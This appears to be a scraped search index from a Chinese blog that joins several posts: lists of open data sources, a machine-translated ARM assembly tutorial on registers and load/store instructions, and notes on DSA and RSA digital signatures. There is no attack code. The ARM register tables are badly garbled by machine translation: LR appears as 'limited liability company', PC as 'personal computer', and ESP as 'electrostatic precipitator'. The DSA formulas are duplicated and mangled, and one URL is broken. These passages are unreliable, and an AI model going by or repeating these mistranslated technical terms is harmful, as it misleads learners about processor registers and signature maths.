repository：在德克萨斯高级计算中心，提供以数据为中心的技术。 Data Source Handbook:公开数据指南。 Data.gov/Education：对于教育数据资源的主要指南，包括高价值的数据集、数据可视化、课堂资源、创建自公开数据的应用程序以及其他。 DataMarket：可视化的世界经济、社会、自然和工业，拥有来自联合国，世界银行，欧盟统计局和其他重要数据提供者的一亿时间序列。 Datamob：可以很好利用的公开数据。 DataSF.org：可向City \u0026 County of San Francisco, CA.购买的数据集信息交流中心。 DataFerrett：一个用来访问和使用The Data Web的数据挖掘工具，许多网上美国政务数据集的集合。 EconData：大量经济学的时间序列，由许多美国政府机构编制。 Enron Email Dataset：来自大约150个用户的数据，这些用户大多数是安然公司高级管理人员。 Europeana Data：包含2000万文字，图片，视频开放的元数据，以及由欧洲数位图书馆收集的声音，对于欧洲文化遗产内容值得信赖的、全面的资源。 Europeana Data：FEDSTATS：一个美国统计资料的综合资源以及更多。 FIMI repository for frequent itemset mining：工具和数据集。 Financial Data Finder at OSU：大型财务数据集目录。 GDELT:关于事件、位置和音调的全球数据，被英国卫报形容为“生命、宇宙和一切的大数据历史”。 GEO (GEO Gene Expression Omnibus)：一个支持MIAME兼容数据提交的基因表达/分子丰度信息库，用于基因表达数据的浏览，查询和检索。 Google ngrams datasets：来自数Google扫描的百万书籍文本。 Grain Market Research：财务数据，包括股票、期货等。 Hilary Mason research-quality Big Data sets: 收集许多文本和图片数据集. HitCompanies Datasets：HitCompanies随机取样的1万个英国公司全面的数据，采用人工智能/机器学习进行自动更新。 ICWSM-2009 dataset：包含2008年8月1日到10月1日之间的4400万个博文。 Infochimps：一个数据开放的目录和集合，允许分享、出售和下载关于任何内容的数据。 Investor Links：包含财物数据。 KDD Cup center：数据、工作表和结果。 Kevin Chai list of datasets：文本、SNA和其他领域。 KONECT：科布伦茨网络收集，拥有大量各种类型的网络数据集，以便在网络挖掘领域进行研究。 Linking Open Data 工程，免费向所有人提供数据。 MIT Cancer Genomics gene expression datasets and publications：来自麻省理工Whitehead Center用于基因组研究。 ML Data：欧盟Pascal2网络数据储存库。 National Government Statistical Web Sites：来自大约70个网站的数据、报告、统计年鉴、新闻和其他，包括非洲、欧洲、亚洲和拉丁美洲的国家。 National Space Science Data Center (NSSDC)：美国国家航空航天局的数据集，包含行星探索、空间和太阳物理学、生命科学、天体物理学以及其他方面。 Open Data Census：评估世界各地的开放数据的状态。 OpenData from Socrata：允许访问超过10000个数据集，包括商业、教育、政府和娱乐。 Open Source Sports：大量运动数据库，包括棒球、足球、篮球和曲棍球。 Peter Skomoroch dataset Bookmarks PubGene(TM) Gene Database and Tools：基因组有关的出版物数据库。 Quandl, a collaboratively curated portal to millions of financial and economic time-series datasets. qunb：一个用来发现和可视化的数据资料的平台。 Robert Schiller data：住房建筑、股票市场和更多的来自于他的书 Irrational Exuberance的数据 SMD: Stanford Microarray Database,存储来自微阵列实验的原始的和标准的数据。 Jerry Smith dataset collection：财经、政府、机器学习、科学和其他数据。 SourceForge.net Research Data：包含大约10万个项目和超过100万注册用户的活动的历史和现状的统计数据的项目管理网站。 Wikiposit：一个（虚拟的）融合了来自许多不同网站的数据（大多数是金融的），允许用户合并来自不同来源的数据。 Wolfram Alpha disease and patient level dat. Yahoo Sandbox datasets：语言、图表、评级、广告与营销、竞赛。 Yelp Academic Dataset：30家大学的250个最接近商业的所有数据和评论，为学生和学者来探讨和研究。 ","date":"2022-01-01","objectID":"/zh-cn/1/:2:0","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"开放数据源（三），中国，经济为主。 ","date":"2022-01-01","objectID":"/zh-cn/1/:3:0","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"一、政府类 1、国家统计局,如果你需要一应俱全的最新宏观经济数据，一个宝贵的来源是国家统计局提供的《进度统计数据》，网址是http://www.stats.gov.cn/tjsj/。 如果想要从数据收集之日起的完整国民经济核算资料，权威的来源是国家统计局国民经济核算司出版的《中国国内生产总值核算历史资料》（1952-1995） 和《中国国内生产总值核算历史资料》（1996-2002）。在这两本年鉴里，提供了核算中国GDP的详实数据。特别是《中国国内生产总值核算历史资料》 （1996-2002）提供了电子版，电子版数据不仅提供1996-2002年的详实数据，还大致回溯了1952-1995年间的数据，非常好用。如果你想要从数据收集之日起的较为完整的宏观经济数据，《新中国五十年统计资料汇编》和《新中国55年统计资料汇编》是一个不错的选择。遗憾的是，它们都没有提供电子版，但后者可以在中国资讯行下载。 2、工业和信息化部, 较多数据在此发布，尤其是有关工业运行及信息化相关数据。 3、中国人民银行, 中国金融市场政策及运行相关数据。 4、银监会,银行金融相关数据。 5、中国海关,中国进出口相关数据。 6、国家知识产权局,专利相关查询。 7、中国证监会,相关政策及招股书披露平台，以及拟上市公司排队每周披露。 8、上海市政府数据服务网, 上海市政府数据服务网（dataShanghai）集中发布政府部门及第三方机构的数据产品以及数据应用，数据将涉及经济、教育、卫生、交通、地理、法 律、规划等。上海市政府数据服务网（dataShanghai）中，政府部门提供的数据产品目前都是免费的，保留收费的权利。所有的数据与服务都是无需注册可以直接使用的。搜索到需要的数据标题后，点击进入详细页面，可以看到下载图标。就可以按照需求来下载。 9、上海公共研发平台,可以注册，人工审核，内包含较多数据库。 ","date":"2022-01-01","objectID":"/zh-cn/1/:3:1","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"二、综合类 1、中国经济数据库,司尔亚司数据信息有限公司（CEIC）成立于1992年，由经济学家和分析师组成，提供有关世界发达经济和发展中经济的最广泛、最精确的信息。作为欧洲货币机构投资公司的一个产物，我们已经成为世界各地经济学家、分析师、投资者、企业以及院校经济和投资研究的首选。 2、中国经济信息网,行业研究报告，宏观数据较全。中国经济信息网简称中经网，是国家信息中心组建的、以提供经济信息为主要业务的专业性信息服务网络。 3、中国资讯行数据库,收费宏观经济数据。 4、国研网, 数据较为权威，有些报告可以一看。 5、中国国家图书馆 ","date":"2022-01-01","objectID":"/zh-cn/1/:3:2","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"三、金融类 证券 1、上海证券交易所,其中研究出版栏目中有些研究报告. 2、深圳证券交易所,其中研究/刊物中有研究报告 3、全国中小企业股份转让系统（新三板）,新三板挂牌公司的转让及信息披露. 4、香港证券交易所 5、台湾证券交易所 6、新加坡证券交易所 7、纽约证券交易所 8、纳斯达克证券交易所 金融 1、万德数据库（金融） 中国大陆领先的金融数据、信息和软件服务企业，Wind资讯的客户包括超过90%的中国证券公司、基金管理公司、保险公司、银行和投资公司等金融企业；在 国际市场，已经被中国证监会批准的合格境外机构投资者（QFII）中75%的机构是Wind资讯的客户。同时国内多数知名的金融学术研究机构和权威的监管 机构也是我们的客户，大量中英文媒体、研究报告、学术论文等经常引用Wind资讯提供的数据。 定位：高端机构客户 机构市场占有率：80% 优势：（1）数据表结构还是比较科学，而且还有很多不同工具，例如WACC计算小插件、贝塔计算小插件、另外还有直接在EXCEL估值的模版。 （2）用户体现非常好，界面体验一流，符合中国人的使用习惯。 （3）特色数据库有中国A\\B股数据、基金数据、债券数据和期货数据都非常突出。 （4）资讯内容结构严重模仿BLOOMBERG （5）支持API插件 缺点 （1）其实我想突出数据质量只是一般，有一些还是很多错误、例如指数的数据库的错误和雅虎Finance几乎是一样的。 （2）世界指数等国际数据库还是一般。 （3）主要是提供资讯，下单通道没有Bloomberg没有那么强大。 （4）行业数据严重缺乏，而且质量真的不太好。 2、恒生聚缘（金融） 这个数据库其实也是定位为机构的，还有一套完全的信息技术系统解决方法。但是这个数据库不太出名，但是这是我用过价格便宜然后质量非常高的数据库。 优点： （1）界面设计虽然没有万德那么花哨，但是非常实在，非常实用，而且很方便。数据结构也科学，不会出现过多冗余的状况。 （2）价格比万德便宜，但是性价比挺高的。 （3）A\\B股数据是强项 （4）研究报告更新速度比较快，比较全面、质量比万德好。 （5）数据质量过硬。 3、CSMAR数据库（金融） 定位：中国80%的学术机构和香港高校都是使用CSMAR，美国大部分的大学例如沃顿等是使用CSMAR数据库 优点 （1）公司金融数据是强项，非常强大和齐全，我经常使用哈哈。 （2）数据库做学术还是比较全面的。年份比较早的数据都会有收录。 （3）高频数据是全国第二好。 （4）公司治理数据比较好，详细，包括公司控制链图均有收录。 缺点： （1）由于是学术数据库关系，更新速度不够快。机构是绝对不会使用的。 （2）数据结构有些设计是有问题。 （3）缺乏资讯类的数据。 （4）行业数据是更新速度是所有数据库中最慢的，建议不要使用行业数据库。 4、锐思数据库（金融） 定位：学术机构 特点： 基本上是Copy外国的数据库结构，而且数据字段不够丰富，建议不要使用。 5、巨潮数据库（金融） 深交所旗下的一个数据库公司，有这个得天独厚的优势. （1）交易所的公告、董事会决议总是最快可以知道。 （2）异动数据库中的异动记录肯定不止前十名，获取还能看到前15名，哈哈！ 缺点 （1）数据结构太老的了，严重有问题，见过5个字段来做表主键的，无语。 （2）好像异动数据库，把所有的债券、股票、衍生证、涡轮全部放在一起，结果有一次踩地雷，把债券和股票都提了出来，原因是股票的代码=债券的代码，真的囧死了。 （3）异动数据中的计算方法严重不正确，如果你查阅交易所对涨跌幅偏离值的计算方法，你会发现在2006年8月4日前后会非常不同。结果又一次让我踩到地雷。 （4）数据质量一般，算不上好。 6、清科数据库（金融） 清科研究数据库包含风险投资,私募股权,创业者相关投资,私募,并购,上市数据库,范围涉及投资机构,企业,投资人物相关TMT、传统行业、清洁技术、生技健康等行业市场事件用的比较少，专做Pe,风险投资数据的。 7、人大经济论坛 http://bbs.pinggu.org/forum-55-1.html 有许多数据叫卖，提供大量的可供下载的经济学资源，而且还有许多有用的连接。当然，这是一个免费的网站，但下载某些资源时，说不定要求一定的所谓积分限制。这个强力推荐~~ ","date":"2022-01-01","objectID":"/zh-cn/1/:3:3","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"四、互联网类 1、淘宝指数 2、互联网TMT数据 3、百度指数（综合） ","date":"2022-01-01","objectID":"/zh-cn/1/:3:4","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"五、自然卫生类 1、中国气象局 2、中国气象科学数据共享服务网 在http://cdcNaNa.gov.cn注册为用户后（密码会发送至你的邮箱）登录，选择数据种类（共14大类），在每类中选择你所关心的数据集，这时弹出每个数据集的元数据信息页面。页面正中有检索方式，选台站或空间、时间就可得到检索结果，点击下载即可。CDC网站的数据只要是共享的数据，就是免费的。 3、公共卫生科学数据中心 ","date":"2022-01-01","objectID":"/zh-cn/1/:3:5","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"房地产 克尔瑞（房地产） ,中国最大、最先进的房地产数据库，易居中国旗下。 ","date":"2022-01-01","objectID":"/zh-cn/1/:3:6","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"其他 1、数据堂 2、数据熊猫（导航） ","date":"2022-01-01","objectID":"/zh-cn/1/:3:7","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["数据源"],"content":"开放数据源（四），遥感、地理信息 中国国家海洋卫星应用中心 中国资源卫星应用中心 SRTM全球地形高程测量,http://dds.cr.usgs.gov/srtm/,http://www.cgiar-csi.org/data/srtm-90m-digital-elevation-database-v4-1,http://dwtkns.com/srtm/,http://elevation.bopen.eu/en/stable/quickstart.html TM全球15米存档多波段专题影像,貌似已无法访问。 German Aerospace Center (DLR) 其它TM和MSS: http://earthexplorer.usgs.gov/ http://edcsns17.cr.usgs.gov/earthexplorer http://glovis.usgs.gov/ http://landsat.datamirror.csdb.cn/ , 这是中科院的国际科学数据服务平台。 多光谱卫星影像： http://speclab.cr.usgs.gov http://asterweb.jplnasa.gov 遥感数据免费下载网址： 1.http://www.landsat.org/ortho/index.htm 2.http://edcdaac.usgs.gov/datapool/datatypes.asp 3.modis L1B 1km,免费注册，免费下载，daily data. 4.http://edcimswww.cr.usgs.gov/pub/imswelcome/ 5.http://glovis.usgs.gov/ 6.landsat etm+ and tm images for http://www.landsat.org/ortho/index.htm 全球DEM、遥感图像、矢量图像免费下载 全球各国shape数据下载，包括矢量要素、dem数据、遥感图片，免费，精度不知。 http://biogeo.berkeley.edu/bgm/gdata.php 全球各国eoo格式数据下载，包括矢量要素、dem数据、遥感图片，需付费，也有部分类型数据免费，精度不知道。 http://data.geocomm.com/ 公开的DEM数据,SRTM3/SRTM,数据主要是由美国太空总署(NASA)和国防部国家测绘局(NIMA) 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2022-01-01","objectID":"/zh-cn/1/:4:0","tags":["数据源"],"title":"开放数据源-社会、经济、地理、空间，数据科学家的宝库","uri":"/zh-cn/1/"},{"categories":["汇编","ARM"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 数据类型 这是 ARM 程序集基础知识教程系列的第二部分，涵盖数据类型和寄存器。 与高级语言类似，ARM 支持对不同数据类型的操作。 我们可以加载（或存储）的数据类型可以是有符号和无符号的单词，半字或字节。这些数据类型的扩展名是：-h 或 -sh 表示半字，-b 或 -sb 表示字节，没有单词的扩展名。有符号数据类型和无符号数据类型之间的区别在于：![img](https://azeria-labs.com/wp-content/uploads/2017/03/data-types-1.png) 有符号数据类型可以同时保存正值和负值，因此范围较小。 无符号数据类型可以保存较大的正值（包括\"零\"），但不能保存负值，因此范围更广。 以下是一些示例，说明如何将这些数据类型与加载和存储说明一起使用： ldr = Load Word ldrh = Load unsigned Half Word ldrsh = Load signed Half Word ldrb = Load unsigned Byte ldrsb = Load signed Bytes str = Store Word strh = Store unsigned Half Word strsh = Store signed Half Word strb = Store unsigned Byte strsb = Store signed Byte 字节序 有两种查看内存中字节的基本方法：小端字节序 （LE） 或大端字节序 （BE）。不同之处在于对象的每个字节存储在内存中的字节顺序。在像英特尔 x86 这样的小端机器上，最小有效字节存储在最低地址（最接近零的地址）。在大端机器上，最高有效字节存储在最低地址。ARM架构在版本3之前是小端序，从那时起它是双端序，这意味着它具有允许可切换字节序的设置。例如，在 ARMv6 上，指令是固定的小端字节序，数据访问可以是小端或大端，由程序状态寄存器 （CPSR） 的位 9（E 位）控制。 ARM 寄存器 寄存器的数量取决于 ARM 版本。根据ARM参考手册，有30个通用32位寄存器，但基于ARMv6-M和ARMv7-M的处理器除外。前 16 个寄存器可在用户级模式下访问，附加寄存器可在特权软件执行中使用（ARMv6-M 和 ARMv7-M 除外）。在本教程系列中，我们将使用可在任何特权模式下访问的寄存器：r0-15。这16个寄存器可以分为两组：通用寄存器和特殊用途寄存器。 # 别名 目的 R0 型 – 一般用途 R1型 – 一般用途 R2 型 – 一般用途 R3 型 – 一般用途 R4 型 – 一般用途 R5 型 – 一般用途 R6 型 – 一般用途 R7 型 – 持有系统调用号码 R8 型 – 一般用途 R9 型 – 一般用途 R10 型 – 一般用途 R11 型 断续器 帧指针 特殊用途寄存器 R12 型 断续器 程序内调用 R13 型 断续器 堆栈指针 R14 型 有限责任公司 链接 注册 R15 型 个人电脑 程序计数器 断续器 – 当前计划状态注册 下表只是快速浏览了 ARM 寄存器与英特尔处理器中的寄存器之间的关系。 手臂 描述 x86 R0 型 一般用途 断续器 R1-R5型 一般用途 EBX， ECX， EDX， ESI， EDI R6-R10型 一般用途 – R11 （FP） 帧指针 断续器 R12 型 程序内调用 – R13 （SP） 堆栈指针 电除尘器 R14 （LR） 链接 注册 – R15 （电脑） \u003c- 程序计数器/指令指针 -\u003e 弹性公网IP 断续器 当前程序状态寄存器/标志 埃弗拉格 **R0-R12：**可以在常见操作期间用于存储临时值，指针（内存的位置）等。例如，R0可以在算术运算期间称为累加器，或者用于存储先前调用的函数的结果。R7在使用系统调用时变得很有用，因为它存储了系统调用号，R11帮助我们跟踪作为帧指针的堆栈上的边界（稍后将介绍）。此外，ARM 上的函数调用约定指定函数的前四个参数存储在寄存器 r0-r3 中。 **R13：SP（**堆栈指针）。堆栈指针指向堆栈的顶部。堆栈是用于特定于函数的存储的内存区域，在函数返回时回收该存储区域。因此，堆栈指针用于在堆栈上分配空间，方法是从堆栈指针中减去我们要分配的值（以字节为单位）。换句话说，如果我们想分配一个 32 位的值，我们从堆栈指针中减去 4。 **R14：LR（**链接寄存器）。进行函数调用时，链接寄存器将使用引用从中启动函数的下一个指令的内存地址进行更新。这样做允许程序返回到在\"子\"函数完成后启动\"子\"函数调用的\"父\"函数。 **R15：PC（**程序计数器）。程序计数器按所执行指令的大小自动递增。此大小在 ARM 状态下始终为 4 个字节，在 THUMB 模式下始终为 2 个字节。当执行分支指令时，PC会保存目标地址。在执行过程中，PC 将当前指令的地址加上 8（两条 ARM 指令）存储在 ARM 状态，并将当前指令加 4（两条 Thumb 指令）的地址存储在 Thumb（v1） 状态。这与x86不同，在x86中，PC始终指向要执行的下一条指令。 让我们看一下电脑在调试器中的行为。我们使用以下程序将pc的地址存储到r0中，并包含两个随机指令。让我们看看会发生什么。 .section .text .global _start _start: mov r0, pc mov r1, #2 add r2, r1, r1 bkpt 在 GDB 中，我们在 _start 处设置了一个断点并运行它： gef\u003e br _start Breakpoint 1 at 0x8054 gef\u003e run 以下是我们首先看到的输出的屏幕截图： $r0 0x00000000 $r1 0x00000000 $r2 0x00000000 $r3 0x00000000 $r4 0x00000000 $r5 0x00000000 $r6 0x00000000 $r7 0x00000000 $r8 0x00000000 $r9 0x00000000 $r10 0x00000000 $r11 0x00000000 $r12 0x00000000 $sp 0xbefff7e0 $lr 0x00000000 $pc 0x00008054 $cpsr 0x00000010 0x8054 \u003c_start\u003e mov r0, pc \u003c- $pc 0x8058 \u003c_start+4\u003e mov r0, #2 0x805c \u003c_start+8\u003e add r1, r0, r0 0x8060 \u003c_start+12\u003e bkpt 0x0000 0x8064 andeq r1, r0, r1, asr #10 0x8068 cmnvs r5, r0, lsl #2 0x806c tsteq r0, r2, ror #18 0x8070 andeq r0, r0, r11 0x8074 tsteq r8, r6, lsl #6 我们可以看到PC持有将要执行的下一条指令（mov r0，pc）的地址（0x8054）。现在让我们执行下一条指令，之后R0应该保存PC的地址（0x8054），对吧？ $r0 0x0000805c $r1 0x00000000 $r2 0x00000000 $r3 0x00000000 $r4 0x00000000 $r5 0x00000000 $r6 0x00000000 $r7 0x00000000 $r8 0x00000000 $r9 0x00000000 $r10 0x00000000 $r11 0x00000000 $r12 0x00000000 $sp 0xbefff7e0 $lr 0x00000000 $pc 0x00008058 $cpsr 0x00000010 0x8058 \u003c_start+4\u003e mov r0, #2 \u003c- $pc 0x805c \u003c_start+8\u003e add r1, r0, r0 0x8060 \u003c_start+12\u003e bkpt 0x0000 0x8064 andeq r1, r0, r1, asr #10 0x8068 cmnvs r5, r0,","date":"2021-12-31","objectID":"/zh-cn/31/:0:0","tags":["汇编","ARM"],"title":"数据类型","uri":"/zh-cn/31/"},{"categories":["数字签名"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 数字签名 ","date":"2021-12-27","objectID":"/zh-cn/27/:0:0","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"其作用主要有: 保证信息传输的完整性 发送者的身份认证 防止交易中的抵赖发生 ","date":"2021-12-27","objectID":"/zh-cn/27/:1:0","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"拥有以下几个特性: 签名是可信的：任何人都可以验证签名的有效性。 签名是不可伪造的：除了合法的签名者之外，任何其他人伪造其签名是困难的。 签名是不可复制的：对一个消息的签名不能通过复制变为另一个消息的签名。如果对一个消息的签名是从别处复制得到的，则任何人都可以发现消息与签名之间的不一致性，从而可以拒绝签名的消息。 签名的消息是不可改变的：经签名的消息不能被篡改。一旦签名的消息被篡改，则任何人都可以发现消息与签名之间的不一致性。 签名是不可抵赖的：签名者事后不能否认自己的签名。 ","date":"2021-12-27","objectID":"/zh-cn/27/:2:0","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"常见的实现方式有: DSA RSA ElGamal ","date":"2021-12-27","objectID":"/zh-cn/27/:3:0","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"DSA ","date":"2021-12-27","objectID":"/zh-cn/27/:4:0","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"基本原理 密钥生成 选择一个合适的哈希函数 选择密钥的长度 L 和 N，这两个值决定了签名的安全程度 选择 N 比特的素数 q 选择 L 比特的素数 p，使得 p-1 是 q 的倍数 选择满足 𝑔𝑘≡1𝑚𝑜𝑑𝑝gk≡1modp 的最小正整数 k 为 q 的 g，即在模 p 的背景下，ord𝑔g=q 的 g。这里，我们可以通过计算 𝑔=ℎ𝑝−1𝑞𝑚𝑜𝑑𝑝g=hp−1qmodp 来得到 g，其中1\u003ch\u003cp−11\u003ch\u003cp−1 选择私钥 x，0\u003cx\u003cq0\u003cx\u003cq ,c计算 𝑦≡𝑔𝑥𝑚𝑜𝑑𝑝y≡gxmodp 公钥为 𝑝,𝑞,𝑔,𝑦p,q,g,y，私钥为 𝑥x 签名 签名步骤如下 选择随机整数数 k 作为临时密钥，0\u003ck\u003cq0\u003ck\u003cq 计算 𝑟≡(𝑔𝑘𝑚𝑜𝑑𝑝)𝑚𝑜𝑑𝑞r≡(gkmodp)modq 计算 𝑠≡(𝐻(𝑚)+𝑥𝑟)𝑘−1𝑚𝑜𝑑𝑞s≡(H(m)+xr)k−1modq 签名结果为 𝑟,𝑠r,s ","date":"2021-12-27","objectID":"/zh-cn/27/:4:1","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"验证 验证过程如下 计算辅助值，𝑤=𝑠−1𝑚𝑜𝑑𝑞w=s−1modq 计算辅助值，𝑢1=𝐻(𝑚)𝑤𝑚𝑜𝑑𝑞u1=H(m)wmodq 计算辅助值，𝑢2=𝑟𝑤𝑚𝑜𝑑𝑞u2=rwmodq 计算𝑣=(𝑔𝑢1𝑦𝑢2𝑚𝑜𝑑𝑝)𝑚𝑜𝑑𝑞v=(gu1yu2modp)modq 如果 v 与 r 相等，则校验成功 ","date":"2021-12-27","objectID":"/zh-cn/27/:4:2","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"正确性推导 首先，g 满足 𝑔𝑘≡1𝑚𝑜𝑑𝑝gk≡1modp 的最小正整数 k 为 q.所以 𝑔𝑞≡1𝑚𝑜𝑑𝑝gq≡1modp 所以 𝑔𝑥≡𝑔𝑥𝑚𝑜𝑑𝑞𝑚𝑜𝑑𝑝gx≡gxmodqmodp进而 𝑣=(𝑔𝑢1𝑦𝑢2𝑚𝑜𝑑𝑝)≡𝑔𝑢1𝑔𝑥𝑢2≡𝑔𝐻(𝑚)𝑤𝑔𝑥𝑟𝑤≡𝑔𝐻(𝑚)𝑤+𝑥𝑟𝑤𝑚𝑜𝑑𝑝v=(gu1yu2modp)≡gu1gxu2≡gH(m)wgxrw≡gH(m)w+xrwmodp 又𝑠≡(𝐻(𝑚)+𝑥𝑟)𝑘−1𝑚𝑜𝑑𝑞s≡(H(m)+xr)k−1modq 且𝑤=𝑠−1𝑚𝑜𝑑𝑞w=s−1modq 所以 𝑘≡𝑠−1(𝐻(𝑚)+𝑥𝑟)≡𝐻(𝑚)𝑤+𝑥𝑟𝑤𝑚𝑜𝑑𝑞k≡s−1(H(m)+xr)≡H(m)w+xrwmodq 所以𝑣≡𝑔𝑘𝑚𝑜𝑑𝑞v≡gkmodq 正确性得证 ","date":"2021-12-27","objectID":"/zh-cn/27/:4:3","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"RSA ","date":"2021-12-27","objectID":"/zh-cn/27/:5:0","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":["数字签名"],"content":"原理 原理类似于 RSA 加密，只是这里使用私钥进行加密，将加密后的结果作为签名 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-27","objectID":"/zh-cn/27/:5:1","tags":["数字签名"],"title":"数字签名","uri":"/zh-cn/27/"},{"categories":[],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 内存说明：加载和存储 ARM 使用负载存储模型进行内存访问，这意味着只有加载/存储（LDR 和 STR）指令才能访问内存。虽然在x86上，大多数指令都允许直接对内存中的数据进行操作，但在ARM上，数据在操作之前必须从内存移动到寄存器中。这意味着在 ARM 上的特定内存地址处递增 32 位值需要三种类型的指令（加载、递增和存储），以便首先将特定地址处的值加载到寄存器中，在寄存器中递增，然后将其存储回寄存器中的内存。 为了解释 ARM 上加载和存储操作的基础知识，我们从一个基本示例开始，然后继续学习三种基本偏移形式，每种偏移形式具有三种不同的地址模式。对于每个示例，我们将使用具有不同 LDR/STR 偏移形式的同一段汇编代码，以保持其简单性。遵循本教程这一部分的最佳方式是在实验室环境中的调试器 （GDB） 中运行代码示例。 偏移形式**：作为**偏移量的即时值 寻址模式：偏移 寻址模式：预索引 寻址模式：后索引 偏移形式：注册为偏移量 寻址模式：偏移 寻址模式：预索引 寻址模式：后索引 偏移形式：缩放寄存器作为偏移量 寻址模式：偏移 寻址模式：预索引 寻址模式：后索引 第一个基本示例 通常，LDR 用于将某些内容从内存加载到寄存器中，而 STR 用于将某些内容从寄存器存储到内存地址。 LDR R2, [R0] @ [R0] - origin address is the value found in R0. STR R2, [R1] @ [R1] - destination address is the value found in R1. LDR 操作：将R0 中地址处的值加载到目标寄存器 R2。 STR 操作：将 R2 中找到的值存储到 R1 中找到的内存地址。 这是它在功能汇编程序中的样子： .data /* the .data section is dynamically created and its addresses cannot be easily predicted */ var1: .word 3 /* variable 1 in memory */ var2: .word 4 /* variable 2 in memory */ .text /* start of the text (code) section */ .global _start _start: ldr r0, adr_var1 @ load the memory address of var1 via label adr_var1 into R0 ldr r1, adr_var2 @ load the memory address of var2 via label adr_var2 into R1 ldr r2, [r0] @ load the value (0x03) at memory address found in R0 to register R2 str r2, [r1] @ store the value found in R2 (0x03) to the memory address found in R1 bkpt adr_var1: .word var1 /* address to var1 stored here */ adr_var2: .word var2 /* address to var2 stored here */ 在底部，我们有我们的文本池（同一代码部分中的内存区域，用于存储常量，字符串或偏移量，其他人可以以与位置无关的方式引用），其中我们使用标签存储var1和var2（在顶部的数据部分中定义）的内存地址adr_var1和adr_var2。第一个 LDR 将 var1 的地址加载到寄存器 R0 中。第二个 LDR 对 var2 执行相同的操作，并将其加载到 R1。然后，我们将存储在 R0 中找到的内存地址的值加载到 R2，并将在 R2 中找到的值存储到 R1 中找到的内存地址。 当我们将某些内容加载到寄存器中时，括号 （[ ]） 表示：在这些括号之间的寄存器中找到的值是我们要从中加载某些内容的内存地址。 当我们将某些内容存储到内存位置时，括号（[ ]）表示：在这些括号之间的寄存器中找到的值是我们要存储某些内容的内存地址。 这听起来比实际情况更复杂，因此下面是在调试器中执行上述代码时内存和寄存器发生的情况的可视化表示： 让我们看一下调试器中的相同代码。 gef\u003e disassemble _start Dump of assembler code for function _start: 0x00008074 \u003c+0\u003e: ldr r0, [pc, #12] ; 0x8088 \u003cadr_var1\u003e 0x00008078 \u003c+4\u003e: ldr r1, [pc, #12] ; 0x808c \u003cadr_var2\u003e 0x0000807c \u003c+8\u003e: ldr r2, [r0] 0x00008080 